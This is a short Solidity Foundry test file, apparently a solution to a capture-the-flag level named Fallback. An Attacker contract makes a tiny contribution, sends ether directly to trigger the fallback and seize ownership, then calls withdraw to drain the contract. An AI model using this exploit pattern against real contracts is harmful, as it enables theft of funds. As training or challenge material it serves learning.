// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Fallback} from "../instances/Ilevel01.sol";

contract Attacker is Test {
    Fallback fb = new Fallback();

    function test() external {
        vm.startBroadcast();
        console.log("balance of msg.sender: %d", msg.sender.balance);
        fb.contribute{value: 1 wei}();
        uint contribution = fb.getContribution();
        console.log("contribution: %d", contribution);
        payable(fb).transfer(1 wei);
        address owner = fb.owner();
        console.log("owner: ", owner);
        fb.withdraw();
        vm.stopBroadcast();
    }
}
